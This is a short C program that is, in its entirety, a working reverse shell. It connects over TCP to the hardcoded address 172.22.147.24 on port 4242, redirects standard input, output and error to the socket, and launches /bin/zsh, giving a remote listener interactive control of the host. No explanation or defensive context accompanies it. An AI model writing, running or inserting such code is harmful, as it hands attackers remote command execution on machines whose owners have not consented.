#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (sockt < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("172.22.147.24");

    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
        perror("connect failed");
        close(sockt);
        exit(EXIT_FAILURE);
    }


    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/zsh", NULL};
    execve("/bin/zsh", argv, NULL);

    // If execve fails
    perror("execve failed");
    close(sockt);
    return EXIT_FAILURE;
}
